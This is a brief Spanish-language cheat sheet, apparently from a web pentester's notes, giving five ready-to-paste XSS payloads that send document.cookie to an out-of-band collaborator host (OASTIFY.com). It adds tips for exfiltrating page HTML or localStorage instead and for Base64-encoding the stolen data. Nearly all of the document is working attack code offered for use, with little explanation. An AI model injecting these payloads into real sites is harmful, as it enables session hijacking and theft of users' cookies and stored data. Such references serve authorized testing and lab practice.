# Exfiltrar a OASTIFY (Collaborator) con JS

> Cambiá `OASTIFY.com` por tu payload. Es `document.cookie` (singular). Si la cookie es `HttpOnly`, no sale por JS.

**window.location**
```html
<script>location='https://OASTIFY.com/?c='+encodeURIComponent(document.cookie)</script>
```

**Image (silencioso)**
```html
<script>new Image().src='https://OASTIFY.com/?c='+encodeURIComponent(document.cookie)</script>
```

**fetch (POST para datos largos)**
```html
<script>fetch('https://OASTIFY.com',{method:'POST',mode:'no-cors',body:document.cookie})</script>
```

**iframe**
```html
<script>document.body.appendChild(Object.assign(document.createElement('iframe'),{src:'https://OASTIFY.com/?c='+encodeURIComponent(document.cookie)}))</script>
```

**img onerror (sin `<script>`, para inyección en HTML)**
```html
<img src="1" onerror="window.location='https://OASTIFY.com/?c='+encodeURIComponent(document.cookie)">
```

Otros datos: cambiá `document.cookie` por `document.documentElement.outerHTML`, `JSON.stringify(localStorage)`, etc.

> [!note] En vez de `encodeURIComponent(...)` podés usar `btoa(...)` para mandar el dato en Base64 (evita romper la URL con `;`, `=`, espacios). Luego lo decodificás con Base64 en Collaborator. Ojo: `btoa` falla con caracteres no-Latin1.

## 🔗 [[postmessage]] · [[../../vulnerabilities/002-xss/README|XSS]]
